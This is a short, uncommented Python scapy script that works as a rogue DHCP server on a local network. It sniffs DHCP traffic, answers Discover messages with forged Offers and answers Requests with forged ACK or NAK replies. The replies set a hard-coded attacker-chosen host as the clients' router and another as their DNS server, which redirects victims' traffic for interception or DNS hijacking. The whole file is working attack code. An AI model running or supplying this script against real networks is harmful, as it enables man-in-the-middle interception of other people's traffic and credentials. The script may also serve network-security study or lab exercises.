#!/usr/bin/python
from scapy.all import *
import uuid

macList = []
ip = "172.16.1.100"

def dnsMonitorCallBack(pkt):
    if pkt.haslayer(DHCP):
        d = toDict(pkt[DHCP].options)
        if d['message-type'] == 1:
            packet = NewPacketDHCP(pkt, 2)
            sendp(packet)
        elif d['message-type'] == 3:
            if pkt[Ether].src in macList or ip in d['requested_addr']:
                packet = NewPacketDHCP(pkt, 5)
            else:
                macList.append(pkt[Ether].src)
                packet = NewPacketDHCP(pkt, 6)
            sendp(packet)

def NewPacketDHCP(pkt, message_type):
    packet = Ether(src=get_mac(), dst=pkt[Ether].src) / \
             IP(version=pkt[IP].version, ihl=pkt[IP].ihl, proto="udp", src="172.16.1.5", dst=ip) / \
             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
             BOOTP(op="BOOTREPLY", htype=pkt[BOOTP].htype, hlen=pkt[BOOTP].hlen, xid=pkt[BOOTP].xid, secs=pkt[BOOTP].secs,
                   yiaddr=ip, giaddr="172.16.1.5", chaddr=pkt[BOOTP].chaddr,
                   sname=pkt[BOOTP].sname, file=pkt[BOOTP].file) / \
             DHCP(options=[("message-type", message_type), ("server_id", "172.16.1.5"), ("lease_time", 10800),
                           ("subnet_mask", "255.255.255.0"), ("router", "172.16.1.5"), ("name_server", "172.16.1.66"), "end"])
    return packet

def toDict(array):
    d = dict()
    for i in range(0,len(array)):
        d[array[i][0]] = array[i][1]
    return d

def get_mac():
    return str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()

sniff(prn=dnsMonitorCallBack)